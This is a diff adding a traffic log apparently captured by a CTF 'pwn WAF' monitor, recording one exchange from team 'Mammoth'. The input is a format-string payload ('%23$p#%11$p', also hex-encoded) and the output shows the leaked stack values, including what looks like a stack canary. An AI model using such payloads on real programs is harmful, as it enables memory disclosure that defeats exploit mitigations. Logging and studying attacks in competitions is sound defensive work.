@@ -1,0 +1,18 @@
+// Date: 2021-11-27 04:51:39
+// SKYCTF PWN WAF
+// Deved By I0gan
+team_name: Mammoth
+
+user_name: swedsn
+
+
+<-------------------- read ------------------>
+%23$p#%11$p
+
+r_0 = "\x25\x32\x33\x24\x70\x23\x25\x31\x31\x24\x70\x0a"
+
+<-------------------- write ----------------->
+(nil)#0xff02f6d69b648300
+¹U--+--
+
+w_0 = "\x28\x6e\x69\x6c\x29\x23\x30\x78\x66\x66\x30\x32\x66\x36\x64\x36\x39\x62\x36\x34\x38\x33\x30\x30\x0a\xb9\x55\x2d\x2d\x2b\x2d\x2d\x0a"
